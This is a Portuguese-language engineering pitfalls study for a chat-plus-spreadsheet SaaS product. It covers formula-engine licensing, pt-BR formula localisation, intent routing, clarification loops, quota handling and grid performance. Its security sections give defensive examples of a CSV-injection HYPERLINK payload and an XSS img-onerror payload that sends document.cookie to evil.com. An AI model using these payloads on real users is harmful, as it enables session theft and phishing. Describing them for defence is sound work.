# Pitfalls Research

**Domain:** Chat Unificado com roteamento de intent, tabela interativa (mini-Excel), loop de clarificação, e Pro-gating de fluxo unificado — Tabelin.IA v2.0
**Researched:** 2026-06-08
**Confidence:** HIGH

---

## Critical Pitfalls

### Pitfall 1: Licença GPL do HyperFormula Contamina a Codebase Comercial

**What goes wrong:**
HyperFormula usa GPLv3. Em SaaS comercial de código fechado, a GPL é "viral": qualquer projeto que distribua ou sirva o código derivado precisa ou (a) publicar todo o código-fonte sob GPL ou (b) comprar licença comercial da Handsontable. Para uma SaaS web, o debate "serve-via-network ≠ distribution" da GPL v2 não se aplica: a GPLv3 inclui o Affero-style copyleft para network use em muitos contextos de interpretação jurídica. A Handsontable afirma que o uso em SaaS fechado requer licença comercial. Preço não é público — é negociado por contrato, o que implica custo recorrente, vendor lock-in e risco de auditoria.

**Why it happens:**
HyperFormula é a opção mais citada para fórmulas in-browser. Desenvolvedores instalam via npm sem ler a licença ou assumem que GPLv3 só afeta distribuição de binários.

**How to avoid:**
1. **Não usar HyperFormula sem contrato comercial assinado.** O custo/prazo de negociar a licença pode atrasar o milestone.
2. Avaliar alternativas permissivas ANTES de qualquer decisão de stack:
   - **Formulajs** (MIT): implementa ~100 funções Excel; suficiente para tabela básica.
   - **fast-formula-parser** (MIT): parser de fórmulas com avaliador, sem grid embutido.
   - **Formualizer** (MIT/Apache-2.0): foco em parse/evaluate; não inclui grid.
3. Se o conjunto de funções MIT não for suficiente e HyperFormula for escolhido, fechar contrato comercial na fase de stack decision — não como correção posterior.
4. Documentar a decisão de licença como Key Decision em PROJECT.md com fundamento legal.

**Warning signs:**
- `package.json` contém `hyperformula` sem entry correspondente de licença comercial no legal register.
- Nenhum arquivo de licença/contrato com Handsontable no repositório ou na documentação de billing.
- A decisão de usar HyperFormula foi tomada com base em demos/artigos sem leitura do arquivo `LICENSE.txt`.

**Phase to address:**
Fase de definição de stack (antes de qualquer código de tabela). Resolver antes do início do desenvolvimento — não é recuperável sem reescrita do engine.

---

### Pitfall 2: ptBR Não É um Language Pack Built-in do HyperFormula — Nomes de Função Errados

**What goes wrong:**
HyperFormula suporta 17 idiomas embutidos; Brazilian Portuguese (ptBR) **não está na lista** — apenas Portuguese Portugal (ptPT) pode estar presente (a documentação lista apenas "Portuguese" sem especificar variante). Isso significa que as funções localizadas brasileiras — `PROCV`, `SOMASE`, `SE`, `CONT.SE`, `MÉDIA`, `MÁXIMO` — não funcionam out-of-the-box. O usuário digita `=PROCV(...)` na célula e o engine retorna `#NAME?`. O sistema funciona só com nomes em inglês (`VLOOKUP`, `SUMIF`, `IF`), quebrando a proposta central do produto (Brazil-first).

Um language pack customizado para ptBR requer mapear manualmente todas as ~400 funções para os nomes brasileiros oficiais do Excel — trabalho não-trivial e propenso a erros de mapeamento.

**Why it happens:**
Documentação não explicita quais 17 idiomas são suportados. Desenvolvedores assumem que `pt-BR` está incluído em "Portuguese" e descobrem o problema apenas ao testar com fórmulas brasileiras reais.

**How to avoid:**
1. Verificar o repositório GitHub de HyperFormula em `src/i18n/languages/` para confirmar se `ptBR.ts` existe antes de adotar o engine.
2. Se ptBR não existir como pack built-in: criar language pack completo como parte da fase de tabela — escopo real, não overhead.
3. Fonte autoritativa para mapeamento de nomes: Microsoft Excel Online (pt-BR) e o arquivo de help oficial do Excel em português — não usar GPT para gerar o mapeamento (risco de nomes inventados).
4. Para engines alternativos (Formulajs, fast-formula-parser): verificar se o parse aceita fórmulas em português ou se aceita apenas inglês — a maioria aceita só inglês, o que significa que a UI precisa fazer tradução ptBR→EN antes de avaliar.
5. Estratégia de tradução: manter dicionário ptBR↔EN client-side e fazer pre-processing do input do usuário antes de passar ao engine.

**Warning signs:**
- `=SE(A1>0;"positivo";"negativo")` retorna `#NAME?` no protótipo de tabela.
- O language pack do engine está configurado para `enGB` ou `enUS` como fallback sem nenhuma tradução ptBR.
- O mapeamento de função ptBR não cobre funções financeiras como `TAXA`, `NPER`, `VPL`.

**Phase to address:**
Fase de implementação da tabela interativa. Language pack ptBR deve ser um critério de aceite explícito: "célula com `=PROCV()` avalia corretamente."

---

### Pitfall 3: Separador de Argumento — Ponto-e-Vírgula vs Vírgula

**What goes wrong:**
O Excel brasileiro usa ponto-e-vírgula (`;`) como separador de argumentos de função: `=SE(A1>0;"sim";"não")`. A maioria dos engines in-browser (incluindo HyperFormula em modo padrão e Formulajs) usa vírgula americana: `=IF(A1>0,"yes","no")`. Se o engine não suportar o separador brasileiro nativamente, toda fórmula gerada pela IA (que já é configurada para ptBR com `;`) falha no parser da tabela com `#ERROR!` ou parse error silencioso.

O problema é bidirecional: (a) o engine não avalia `=SOMASE(A1:A10;B1:B10;">0")` e (b) se o usuário exportar para CSV e abrir no Excel BR, fórmulas exportadas com `,` como separador ficam quebradas.

**Why it happens:**
A localidade do separador é tratada como detalhe de configuração mas é uma diferença de gramática do parser. Engines que não suportam configuração de separador requerem pré-processamento de cada fórmula antes de avaliar — e pós-processamento para export.

**How to avoid:**
1. Verificar se o engine escolhido tem configuração nativa de separador: HyperFormula tem `functionArgSeparator` e `decimalSeparator` na config — usar `functionArgSeparator: ";"` e `decimalSeparator: ","` para ptBR.
2. Se o engine não suportar configuração de separador: implementar substituição ptBR→EN no input e EN→ptBR no output — documentar como requisito não-opcional antes de escolher o engine.
3. No export CSV/XLSX, garantir que fórmulas exportadas usam o separador do sistema de destino — Excel BR espera `;`.
4. Incluir teste de paridade: `=SOMASE(A1:A5;B1:B5;">0")` deve avaliar identicamente a `=SUMIF(A1:A5,B1:B5,">0")`.

**Warning signs:**
- Engine configurado com defaults de `enGB` e sem `functionArgSeparator` explícito.
- Fórmulas geradas pela IA com `;` produzem `#ERROR!` na tabela enquanto as mesmas fórmulas com `,` funcionam.
- Export de tabela gera arquivo que o Excel BR não reconhece como fórmulas.

**Phase to address:**
Fase de implementação da tabela interativa — antes de conectar a geração de fórmulas ao engine.

---

### Pitfall 4: Latência Adicionada pelo Classifier Step Quebra o SLA de 2.5s

**What goes wrong:**
O v1.x tem SLA de streaming iniciando em ≤2.5 segundos. Um passo de classificação de intent via LLM antes da geração pode adicionar 1–3.5 segundos de latência (zero-shot LLM classification: ~3.4s de latência média documentada em produção). O efeito composto: classifier (1–3s) + streaming start (1–2s) = 2–5s antes da primeira palavra aparecer. Usuários de ferramentas de chat percebem latência > 2s como lentidão.

**Why it happens:**
A classificação via LLM usa o mesmo modelo de geração ou um modelo auxiliar — ambos têm latência de first-token. Desenvolvedores testam o sistema com boa conectividade e não medem a latência end-to-end com o step de classificação incluído.

**How to avoid:**
1. Não usar LLM call dedicado para classificação no caminho crítico. Em vez disso:
   - **Embed-based classifier local** (< 50ms): vetorizar o prompt do usuário e comparar com embeddings de exemplos por toolKind — sem API call.
   - **Keyword heuristics como primeiro filtro** (< 1ms): se o prompt contém "PROCV", "fórmula", "planilha" → provavelmente Formula. Se contém "SELECT", "JOIN", "tabela de dados" → provavelmente SQL. Heurísticas cobrem ~60–70% dos casos.
   - **Classificação embutida no system prompt de geração**: incluir instrução `"Identifique o intent como [formula|sql|regex|script|tabela] e responda no formato correspondente"` — um único call faz classificação + geração.
2. Medir p50/p95 de latência de first-token com o classifier adicionado antes de lançar.
3. Para ambiguidades genuínas, mostrar resposta provisória enquanto o fluxo de geração completo ocorre — não bloquear.

**Warning signs:**
- O fluxo de chat unificado faz duas chamadas sequenciais ao LLM (uma para classificar, uma para gerar).
- Latência de first-token no chat unificado excede 3s em ambiente de produção.
- O pipeline de classificação não tem timeout — uma classificação lenta bloqueia indefinidamente.

**Phase to address:**
Fase de implementação do roteamento de intent. Latência deve ser um critério de aceite explícito: "first-token do chat unificado em ≤ 2.5s (p50), ≤ 4s (p95)."

---

### Pitfall 5: Misrouting de Intent — Regressão de Capacidades ao Remover Tabs

**What goes wrong:**
As tabs atuais (Formula, SQL, Regex, Scripts, File Analysis, OCR) são affordances explícitas: o usuário sinaliza o intent ao navegar para a aba certa. Ao remover as tabs, o sistema precisa inferir o intent de cada prompt — e vai errar. Casos problemáticos documentados:

- "Crie uma fórmula para calcular o IPCA" → pode ser classificado como Formula (correto) ou como tabela (errado se gerar um grid em vez de uma fórmula).
- "Extraia os dados da imagem" → OCR ou File Analysis? Se o usuário tem um arquivo CSV aberto, a ambiguidade é real.
- "Me ajude com esse script" → Scripts ou SQL (stored procedure)?
- Prompts híbridos: "Crie uma query SQL e uma fórmula Excel para o mesmo cálculo" → dois intents simultâneos.

Quando o sistema misrota, o usuário recebe uma resposta no formato errado (ex: query SQL quando esperava fórmula) sem saber como corrigir sem as tabs antigas.

**Why it happens:**
Intent routing é um problema de classificação probabilística. Prompts curtos, ambíguos ou em português informal têm menor sinal de intent. Remover as tabs também remove o mecanismo de correção manual do usuário.

**How to avoid:**
1. Manter um mecanismo de **override explícito** no chat: pills de sugestão abaixo da resposta ("Gerar como fórmula | Gerar como SQL | Gerar como script") para o usuário corrigir sem re-escrever o prompt.
2. Quando a confiança do classifier for baixa (ex: diferença entre top-1 e top-2 < 0.15), perguntar ao usuário: "Você quer uma fórmula ou uma query SQL?" — uma pergunta direta, não um loop de clarificação.
3. Preservar o histórico por toolKind no banco mesmo após a remoção das tabs na UI. A tabela `ConversationExchange` tem campo `toolKind` — continuar populando corretamente para manter isolamento de contexto por intent.
4. No migration path: considerar tabs como "atalhos opcionais" em vez de remover completamente. Oferecer chat unificado como modo padrão com tabs acessíveis via configuração ou sidebar — reduz risco de regressão.
5. Testar regressão: cada capacidade existente (Formula/SQL/Regex/Scripts) deve ter casos de teste no chat unificado com prompts típicos de produção.

**Warning signs:**
- Usuários beta relatam "a resposta veio no formato errado" sem caminho óbvio de correção.
- Taxa de "Nova conversa" aumenta após lançamento do chat unificado (sinal de frustração com outputs incorretos).
- Histórico de conversa mostra exchanges de Formula sendo usados como contexto para uma geração de SQL subsequente.

**Phase to address:**
Fase de implementação do roteamento de intent + fase de migração de UX.

---

### Pitfall 6: Histórico por toolKind Quebra com toolKind Dinâmico

**What goes wrong:**
O sistema atual persiste e carrega histórico por `(userId, toolKind)`. Com chat unificado, o `toolKind` de cada exchange é determinado pelo classifier em runtime — não pelo usuário. Problemas:

1. **Contaminação de contexto**: uma conversa de Formula e uma de SQL que acontecem no mesmo "chat session" são gravadas em toolKinds diferentes, mas o usuário espera continuidade no mesmo thread.
2. **toolKind `undefined` ou `"chat"`**: se o novo endpoint de chat unificado não mapear corretamente para um toolKind, os exchanges caem em uma partição genérica que nenhum tool carrega como contexto.
3. **`findConversationExchanges` com `toolKind = "chat"`**: a função filtra por `mode: GENERATE_MODE` e `toolKind`. Se os exchanges do chat unificado forem persistidos como `toolKind = "unified"`, a lógica de buildToolContextMessages existente não vai injetá-los, e o LLM perde contexto em follow-ups.

**Why it happens:**
O schema de `ConversationExchange` foi projetado para o modelo multi-tab onde toolKind é determinístico. No chat unificado, toolKind se torna uma propriedade dinâmica derivada do classifier — e a integração com o sistema de histórico não foi redesenhada.

**How to avoid:**
1. Definir explicitamente a semântica de `toolKind` no chat unificado: é o intent classificado para AQUELE exchange (permite contexto isolado por intent) ou é `"unified"` para todos (permite contexto cross-intent)?
2. Para continuidade de contexto multi-turn em chat unificado, considerar um `sessionId` como chave de partição adicional em vez de depender só de `toolKind`.
3. Atualizar `serializeAssistant` e `buildToolContextMessages` para suportar o novo toolKind antes de lançar o chat unificado.
4. Smoke tests: garantir que follow-up em chat unificado recebe o histórico correto dos últimos N exchanges.

**Warning signs:**
- `ConversationExchange` com `toolKind = null` ou `toolKind = "undefined"` aparecem no banco após testes do chat unificado.
- Follow-ups no chat unificado não têm contexto dos turnos anteriores (modelo responde como se fosse primeira mensagem).
- `buildToolContextMessages` chamado com `toolKind = "unified"` retorna array vazio de history.

**Phase to address:**
Fase de implementação do chat unificado — antes de conectar ao sistema de histórico existente.

---

### Pitfall 7: Loop de Clarificação Infinito — Nunca Atinge "Confident Enough"

**What goes wrong:**
O loop de clarificação é projetado para que a IA pergunte até ter certeza antes de gerar a tabela. Sem critério de parada explícito, o sistema pode:

1. Fazer 4–6 perguntas de clarificação para uma tabela simples de 3 colunas.
2. Nunca "decidir" que tem informação suficiente — entrar em modo pergunta indefinido.
3. Após o usuário responder uma clarificação, o LLM gera nova clarificação baseada na resposta anterior em vez de gerar a tabela.
4. Pesquisas mostram que LLMs treinados para pedir clarificação tendem a continuar pedindo mesmo quando contexto é suficiente, criando "looping policy."

**Why it happens:**
O critério de "sufficient confidence" é implícito no prompt — não é um score mensurável. O LLM decide subjetivamente se tem informação suficiente. Sem um limite máximo de turnos de clarificação hardcoded, não há barreira que force a geração.

**How to avoid:**
1. **Impor limite máximo de clarificações**: no máximo 2 perguntas por sessão de geração de tabela. Após 2 perguntas sem geração, forçar a geração com o que foi fornecido.
2. **Usar structured output para a decisão**: o LLM retorna `{"action": "clarify" | "generate", "question"?: "...", "confidence": 0.0–1.0}`. Se `confidence > 0.7` e `action == "generate"`, prosseguir sem perguntar.
3. **Mostrar progresso ao usuário**: "1 de 2 perguntas necessárias" — gerencia expectativas e sinaliza que vai acabar.
4. **Escape hatch explícito**: botão "Gerar mesmo assim" no UI após a primeira clarificação — deixa o usuário quebrar o loop.
5. Testar com prompts já detalhados: "Crie uma tabela com colunas A, B, C, com fórmula SOMA na última linha" não deve disparar nenhuma clarificação.

**Warning signs:**
- Em testes, prompts simples geram mais de 2 rodadas de clarificação antes da tabela aparecer.
- O LLM gera nova clarificação após o usuário responder "não importa, qualquer formato está bem."
- Não há campo `maxClarifications` ou similar definido no prompt system ou na lógica do backend.

**Phase to address:**
Fase de implementação do loop de clarificação. O limite máximo deve ser um parâmetro configurável (não hardcoded como número mágico) desde o início.

---

### Pitfall 8: Estado do Loop de Clarificação Perdido na Truncagem de Contexto

**What goes wrong:**
O sistema de truncagem existente (`truncateHistory`) descarta exchanges mais antigos quando o orçamento de tokens é excedido. Em um loop de clarificação com 2–3 turnos, os primeiros turnos (onde o usuário especificou os requisitos da tabela) podem ser truncados antes da geração acontecer. O LLM então gera a tabela sem os requisitos especificados nas clarificações iniciais — ou pede as mesmas clarificações novamente.

Combinado com o fato de que o loop de clarificação introduz exchanges de "modo clarification" que não são do `GENERATE_MODE`, eles podem ser filtrados por `findConversationExchanges` (que filtra `mode: GENERATE_MODE`) e ficar invisíveis ao contexto multi-turn.

**Why it happens:**
O loop de clarificação é um padrão novo que o sistema de contexto existente não foi projetado para suportar. O sistema trata todos os exchanges igualmente na truncagem — sem saber que os requisitos coletados nas clarificações são críticos para a geração final.

**How to avoid:**
1. Definir um `mode` diferenciado para exchanges de clarificação (ex: `"clarification"`) e garantir que esses exchanges são **incluídos** no contexto da geração de tabela, não filtrados.
2. **Serializar o estado da clarificação** como um objeto estruturado (ex: `{"columns": [...], "source": "...", "formulas": [...]}`) e injetá-lo diretamente no system prompt da geração final — não depender de reconstruir o estado a partir do histórico de mensagens.
3. Criar um `ClarificationSession` no banco ou em memória (Redis/in-process) com TTL curto (15 minutos) que acumula os requisitos especificados — ao gerar, usar essa sessão como fonte de verdade, não o histórico truncado.
4. Testar: ciclo completo de clarificação → geração com o contexto de primeiros turnos ausente do histórico (simulando truncagem) deve ainda gerar tabela com os requisitos corretos.

**Warning signs:**
- Exchanges de clarificação salvos com `mode = "generate"` mas conteúdo que não é uma resposta final — filtro funciona incorretamente.
- Em testes com histórico longo, a tabela gerada após clarificação não reflete os requisitos do primeiro turno.
- Não há estrutura de dados de sessão para o estado acumulado de clarificação.

**Phase to address:**
Fase de implementação do loop de clarificação, em coordenação com a fase de histórico/contexto.

---

### Pitfall 9: Token Cost Blowup — O(n²) no Loop de Clarificação Multi-Turn

**What goes wrong:**
Cada turno do loop de clarificação é uma chamada ao LLM. O contexto cresce a cada turno porque o histórico é reenviado. Com 3 turnos de clarificação + 1 geração:
- Turno 1: ~500 tokens (system + prompt inicial)
- Turno 2: ~1.000 tokens (+ histórico do turno 1)
- Turno 3: ~1.500 tokens (+ histórico dos turnos 1–2)
- Geração final: ~2.000 tokens (+ histórico de 3 clarificações)

Total: ~5.000 tokens de input para uma única geração de tabela, vs ~800 tokens em um turno direto. Para usuários que passam pelo loop completo, o custo por geração é 6x maior. Em escala, isso pode duplicar o custo de API sem que o produto perceba — a cota do usuário é debitada apenas na geração final (se assim implementado), não nos turnos de clarificação.

**Why it happens:**
Cada API call em multi-turn inclui todo o histórico anterior no input — custo O(n) por turno, O(n²) total. O fato de clarificações serem "conversas curtas" mascara o custo real.

**How to avoid:**
1. **Comprimir o histórico de clarificação em vez de enviá-lo completo**: ao final de cada turno de clarificação, resumir os requisitos acumulados em um bloco compacto e substituir o histórico por esse resumo nas chamadas subsequentes.
2. **Usar modelo mais barato para clarificações**: usar `gpt-4o-mini` para o loop de clarificação e modelo de maior qualidade apenas para a geração final da tabela.
3. **Monitorar custo por sessão de geração de tabela** separadamente de outros tool kinds — ter dashboards antes de lançar para detectar explosão de custo rapidamente.
4. **Limite de clarificações** (Pitfall 7) também limita o custo máximo — as duas mitigações se reforçam.

**Warning signs:**
- Custo médio por geração de tabela é > 3x o custo de outros tools na mesma janela de tempo.
- Não há diferenciação de modelo (tier) entre clarificação e geração final.
- Histórico completo de clarificação é reenviado em cada turno sem compressão.

**Phase to address:**
Fase de implementação do loop de clarificação — junto com a decisão de modelo e política de histórico.

---

### Pitfall 10: Quota Debitada nas Clarificações em vez de na Geração

**What goes wrong:**
O sistema atual faz `reserveToolUse` no início de cada geração. No fluxo de clarificação → geração, há duas possibilidades de erro:

1. **Debitar na clarificação**: cada turno de pergunta/resposta consome 1 unidade de quota free-tier (4 por 12 horas). Usuários free chegam em zero quota apenas respondendo perguntas, antes de receber qualquer resultado. Experiência horrível.
2. **Debitar uma vez na geração final mas reservar no início do loop**: a reserva é feita no primeiro turno de clarificação, mas a confirmação (`confirmToolUse`) só ocorre na geração final. Se o usuário abandona o loop no meio, a reserva não é liberada (`releaseToolUse` não é chamado), e a quota fica bloqueada até expirar.
3. **Não debitar durante clarificações mas fazer múltiplas reservas**: se o endpoint de clarificação chama `reserveToolUse` a cada turno sem confirmar nem liberar, o usuário perde múltiplas unidades de quota por uma única tentativa de geração.

**Why it happens:**
O padrão reserve/confirm/release foi projetado para um único request de geração. O loop de clarificação é um fluxo multi-request que não tem precedente no sistema atual — a integração com quota não foi especificada.

**How to avoid:**
1. **Regra clara**: quota é debitada **somente na geração da tabela**, não em turnos de clarificação. Clarificações são "gratuitas" na perspectiva de quota.
2. Implementar: a `reserveToolUse` é chamada apenas quando o classifier decide `action: "generate"`, não em turnos de `action: "clarify"`.
3. Se o usuário abandona o loop no meio: a reserva não existe (porque não foi feita), então não há leak de quota.
4. Garantir que o endpoint de clarificação não chama `reserveToolUse` — verificar explicitamente nos critérios de aceite.
5. Para Pro users: clarificações não contam como tool uses — apenas a geração final. Consistente com o comportamento para free (quota = 0 custo em clarificações).

**Warning signs:**
- Usuário free relata "quota esgotada sem ter gerado nada" — fez 4 turnos de clarificação sem receber tabela.
- `usageLedger` contém entradas com `toolKind = "clarification"` ou `status = "reserved"` de sessões abandonadas.
- `releaseToolUse` não é chamado quando o usuário fecha o chat no meio de um loop de clarificação.

**Phase to address:**
Fase de implementação do loop de clarificação + integração com quota-service.

---

### Pitfall 11: Injeção de Fórmula / CSV Injection no Export

**What goes wrong:**
A tabela interativa permite que o usuário edite células. Se o conteúdo de uma célula começa com `=`, `+`, `-` ou `@`, e esse conteúdo é exportado para CSV ou XLSX sem sanitização, o arquivo exportado contém fórmulas ativamente. Quando o destinatário abre o arquivo exportado no Excel, as fórmulas são executadas: um valor de célula como `=HYPERLINK("http://evil.com","clique aqui")` abre uma URL externa. Em casos extremos com funcionalidades legadas do Excel (DDE), pode executar comandos do sistema no computador do destinatário.

O risco é real para uma ferramenta de planilha brasileira onde o output é compartilhado com outros usuários do Excel — o Tabelin.IA é o vetor de distribuição.

**Why it happens:**
Desenvolvedores tratam CSV como formato de texto simples e assumem que Excel vai "só exibir" o conteúdo. O OWASP CSV Injection (WSTG-INPV-21) é um vetor bem documentado mas frequentemente ignorado em ferramentas de planilha.

**How to avoid:**
1. **Sanitizar células no export**: qualquer célula cujo valor textual começa com `=`, `+`, `-`, `@`, `\t`, `\r` deve ser prefixada com `'` (aspas simples) no export para CSV/XLSX — o Excel trata o valor como texto literal, não como fórmula.
2. Para XLSX, usar a opção do SheetJS que define o tipo de célula como `t: "s"` (string) em vez de `t: "f"` (formula) para células editadas pelo usuário.
3. Separar "fórmulas geradas pela IA" (que devem ser fórmulas no export) de "texto do usuário" (que deve ser sanitizado). A IA gera a estrutura da tabela — o usuário edita valores de dados.
4. Incluir teste de segurança: célula editada com `=HYPERLINK(...)` deve exportar como texto literal, não como fórmula executável.

**Warning signs:**
- Export CSV não sanitiza células que começam com `=`.
- XLSX exportado com SheetJS tem células editadas pelo usuário com `t: "f"` (formula type).
- Nenhum teste de segurança cobre o caminho de edit cell → export.

**Phase to address:**
Fase de implementação da tabela interativa (export CSV/XLSX).

---

### Pitfall 12: XSS em Células Renderizadas com HTML

**What goes wrong:**
Se a tabela renderizar o conteúdo de células como HTML (ex: para suportar **bold**, cores ou links) sem sanitização, um valor de célula como `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` executa JavaScript no contexto do browser do usuário. Este é o mesmo vetor de ataque que o sistema atual preveniu com a regra "render seguro sem `dangerouslySetInnerHTML`" (Phase 11 / SEC-01).

**Why it happens:**
Grids de tabela frequentemente oferecem opção de "cell renderer HTML" para formatação rich text. A feature parece útil, mas abre o vetor de XSS se o conteúdo da célula não for sanitizado antes.

**How to avoid:**
1. Renderizar conteúdo de células como **texto puro** por padrão — usar `textContent` (React: children como string, não `dangerouslySetInnerHTML`).
2. Se rich text for necessário para células de cabeçalho geradas pela IA: sanitizar com DOMPurify antes de qualquer renderização HTML.
3. Nunca renderizar fórmulas avaliadas como HTML — apenas o valor calculado como texto.
4. Auditar o componente de grid cell renderer no review de security: verificar que não há `dangerouslySetInnerHTML` sem DOMPurify.

**Warning signs:**
- Célula com `<b>teste</b>` renderiza como texto em bold em vez de exibir os tags literais.
- O componente de célula usa `dangerouslySetInnerHTML` sem wrapper de sanitização.
- Nenhum teste de XSS no renderer de células.

**Phase to address:**
Fase de implementação da tabela interativa (cell renderer).

---

### Pitfall 13: Performance — Grid Sem Virtualização Trava o Browser em Tabelas Maiores

**What goes wrong:**
Sem virtualização, um grid de 500 linhas × 20 colunas renderiza 10.000 nós DOM simultaneamente. Em React, isso resulta em:
- Tempo de render inicial > 2 segundos.
- Scroll lento (< 30 FPS) mesmo em máquinas modernas.
- Recálculo de fórmulas em todas as 10.000 células a cada keystroke em qualquer célula.

Para o perfil de usuário (analistas de planilha brasileiros com laptops corporativos), CPUs lentas e Windows 10 são comuns — os limites de performance são menores do que em máquinas de desenvolvimento.

**Why it happens:**
Protótipos de tabela funcionam bem com 50–100 linhas em máquinas de desenvolvimento. A decisão de adicionar virtualização é adiada para "depois" e nunca acontece.

**How to avoid:**
1. **Adotar virtualização desde a primeira implementação** (TanStack Virtual): renderizar apenas as linhas visíveis no viewport + buffer de ±10 linhas.
2. Definir um **teto de tamanho de tabela para o v2.0**: sugestão 200 linhas × 26 colunas (equivalente a uma planilha pequena). Fora disso, exibir mensagem "tabela muito grande para edição interativa — faça o download para editar no Excel."
3. **Debounce do recálculo de fórmulas**: não recalcular a cada keystroke — recalcular 300ms após o usuário parar de digitar em uma célula.
4. Testar performance com 200 linhas × 20 colunas em Chrome num laptop de mid-range antes de lançar.

**Warning signs:**
- Protótipo de grid usa `array.map()` para renderizar todas as linhas sem virtualização.
- Nenhum limite de tamanho de tabela definido nos requisitos.
- Recálculo de fórmulas acontece no handler `onChange` de cada célula sem debounce.

**Phase to address:**
Fase de implementação da tabela interativa.

---

### Pitfall 14: Scope Creep — "Mini-Excel" Vira Excel Completo

**What goes wrong:**
Uma vez que a tabela interativa existe, surgem demandas incrementais aparentemente razoáveis que, em conjunto, reconstroem o Excel:
- "Adicionar coluna/linha" → gestão de estrutura de grid.
- "Mesclar células" → colspan/rowspan no DOM — complexidade de ordem de magnitude.
- "Formatação condicional" → engine de regras CSS por célula.
- "Múltiplas abas na tabela" → gestão de sheets internas.
- "Gráfico da tabela" → integração com chart engine (já existe, mas contexto diferente).
- "Salvar tabela no histórico" → novo modelo de dados no banco.

Cada feature individual é pequena; a soma é meses de trabalho e um produto diferente do que foi prometido.

**Why it happens:**
A tabela interativa é visualmente próxima de um spreadsheet real. O feedback de usuários e stakeholders naturalmente pede as features que eles usam no Excel. Sem uma linha clara de "fora de escopo", cada pedido parece razoável.

**How to avoid:**
1. Definir explicitamente nos requisitos do v2.0 o que a tabela NÃO suporta: sem merge de células, sem múltiplos sheets, sem formatação condicional, sem resize de coluna com mouse, sem freeze de painel.
2. Documentar o "teto de ambição" como Key Decision em PROJECT.md: "tabela é output de IA + edição de dados simples, não editor de planilha."
3. Para qualquer pedido de feature de spreadsheet fora do escopo definido: resposta padrão é "abre no Excel via export" — isso é uma feature, não uma limitação.
4. Revisar o escopo da tabela no início de cada fase de desenvolvimento — não esperar o UAT para detectar desvio.

**Warning signs:**
- Requisitos da tabela incluem "arrastar para redimensionar colunas" ou "mesclar células."
- O componente de grid tem mais de 1.500 linhas de código antes do fim da primeira fase.
- A equipe refere-se ao componente como "nosso Excel" em vez de "tabela de output de IA."

**Phase to address:**
Fase de definição de requisitos da tabela (antes de qualquer desenvolvimento) e fase de UAT (antes de aceitar novos requisitos).

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Usar HyperFormula sem licença comercial | Engine completo, ~400 funções | Violação de GPL em SaaS fechado; custo de relicenciamento ou reescrita | Nunca em SaaS comercial — resolver antes de qualquer código. |
| Classificação de intent via LLM call dedicado | Classificação flexível, sem heurísticas | +1–3s de latência por request; custo de API duplicado | Nunca no caminho crítico de geração — usar como fallback apenas. |
| Persistir toolKind como `"unified"` para todo chat | Implementação simples | Histórico cross-intent contamina contexto; follow-ups perdem precisão | Nunca — definir toolKind por exchange desde o início. |
| Loop de clarificação sem limite de turnos | LLM decide livremente | Loops infinitos; usuário frustrado; custo de tokens O(n²) | Nunca — limite máximo é requisito não-negociável. |
| Debitar quota por turno de clarificação | Implementação simples com reserve/confirm padrão | Quota free esgotada sem nenhum resultado para o usuário | Nunca — debitar somente na geração. |
| Export CSV sem sanitização de fórmulas | Menos código | CSV injection em destinatários do arquivo exportado | Nunca — sanitização é critério de aceite do export. |
| Grid sem virtualização no v2.0 inicial | Desenvolvimento mais rápido | Trava browser com >200 linhas; refatoração custosa depois | Nunca — adicionar TanStack Virtual desde o início. |
| Construir features de "Excel completo" sob demanda | Satisfaz pedidos imediatos | Scope creep; produto indefinido; manutenção crescente | Nunca sem revisão de escopo formal e Key Decision documentada. |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| HyperFormula / formula engine ptBR | Configurar com defaults `enGB`, assumir que ptBR é suportado built-in | Verificar language pack ptBR em `src/i18n/languages/ptBR.ts`; criar custom pack se ausente; configurar `functionArgSeparator: ";"` explicitamente |
| HyperFormula / formula engine ptBR | Usar nomes em inglês (VLOOKUP) na tabela e nomes em português (PROCV) na geração de fórmulas | Manter dicionário de tradução ptBR↔EN; pré-processar fórmulas da IA antes de enviar ao engine |
| Quota service (reserveToolUse) no loop de clarificação | Chamar `reserveToolUse` em cada turno do loop | Chamar `reserveToolUse` somente quando `action === "generate"` — clarificações são gratuitas |
| ConversationExchange + chat unificado | Persistir exchanges de clarificação com `mode: "generate"` | Usar `mode: "clarification"` para exchanges do loop; garantir que buildToolContextMessages inclua exchanges de clarificação relevantes |
| SheetJS export XLSX | Exportar células editadas pelo usuário com type `t: "f"` (formula) | Definir tipo de célula como `t: "s"` (string) para valores editados pelo usuário; usar `t: "f"` somente para fórmulas da estrutura original gerada pela IA |
| TanStack Virtual + formula engine | Recalcular todas as células no scroll/resize | Separar recálculo de fórmulas (engine) de rerender (virtualização); engine pode operar em dados off-screen, virtualização só renderiza visíveis |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| LLM call de classificação no caminho crítico | Latência de first-token > 3s no chat unificado | Usar heurísticas de keyword + embed classifier local; LLM classifier apenas como fallback | Desde o primeiro request em produção com latência de rede real |
| Grid sem virtualização | Scroll < 30 FPS com > 100 linhas; render inicial > 2s | TanStack Virtual desde a primeira implementação | > 200 linhas em laptops mid-range (comum em empresas brasileiras) |
| Recálculo de fórmulas síncrono em onChange | UI trava ao digitar em célula com dependências | Debounce de 300ms + Web Worker para recálculo se engine suportar | Qualquer tabela com > 50 fórmulas interdependentes |
| Contexto O(n²) no loop de clarificação | Custo de API 5–10x maior que ferramenta similar | Comprimir histórico de clarificação em resumo estruturado; limite de 2 turnos | A partir do segundo turno de clarificação |
| Histórico de chat completo re-enviado no chat unificado sem toolKind filtering | Contexto de SQL injetado em geração de fórmula | Filtrar histórico por toolKind classificado mesmo em modo chat unificado | Conversas mistas de múltiplos intents a partir de 3–4 exchanges |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Export CSV sem prefixo `'` em células iniciadas com `=`, `+`, `-`, `@` | CSV injection — fórmulas executadas no Excel do destinatário; phishing, exfiltração de dados | Prefixar qualquer valor de célula textual que inicia com esses caracteres com `'` antes de escrever no CSV |
| Células renderizadas como HTML sem sanitização DOMPurify | XSS — execução de JavaScript no browser do usuário | Renderizar células como texto puro (textContent); DOMPurify se rich text for necessário |
